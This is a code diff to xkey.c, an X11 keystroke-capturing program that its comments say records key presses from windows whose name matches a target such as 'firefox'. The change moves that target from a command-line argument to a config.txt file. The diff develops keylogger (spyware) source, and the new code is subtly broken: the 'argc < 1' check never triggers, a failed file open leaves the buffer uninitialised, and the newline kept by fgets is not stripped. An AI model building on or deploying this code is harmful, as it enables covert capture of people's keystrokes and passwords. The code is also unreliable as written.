@@ -1,7 +1,7 @@
 /*
  * Usage Example:
  *    gcc -o xkey xkey.c -lX11 -lm
- *    ./xkey :0 "designate_name"
+ *    ./xkey :0
  *
  * If there is at least one top-level window whose name contains "designate_name",
  * we ONLY capture KeyPress/FocusIn from that window (or those windows).
@@ -238,21 +238,42 @@ char *TranslateKeyCode(XEvent *ev)
     return key_buff;
 }
 
+void getDesignatedName(char *designated_name)
+{
+    FILE *fp = fopen("config.txt", "r");
+
+    if (!fp)
+    {
+        designated_name = "";
+        return;
+    }
+
+    if (fgets(designated_name, 256, fp) == NULL)
+    {
+        perror("fgets");
+        exit(1);
+    }
+
+    fclose(fp);
+}
+
 /* --------------------------------------------------
  * main()
  * -------------------------------------------------- */
 int main(int argc, char **argv)
 {
     char *hostname;
-    if (argc < 2)
+    if (argc < 1)
     {
-        fprintf(stderr, "Usage: %s <display> <designated-name>\n", argv[0]);
-        fprintf(stderr, "Example: %s :0 firefox\n", argv[0]);
+        fprintf(stderr, "Usage: %s <display>\n", argv[0]);
+        fprintf(stderr, "Example: %s :0 \n", argv[0]);
         exit(1);
     }
 
     hostname = argv[1];
-    const char *designated_name = (argc >= 3) ? argv[2] : "";
+    char *designated_name = malloc(256);
+
+    getDesignatedName(designated_name);
 
     d = XOpenDisplay(hostname);
     if (d == NULL)
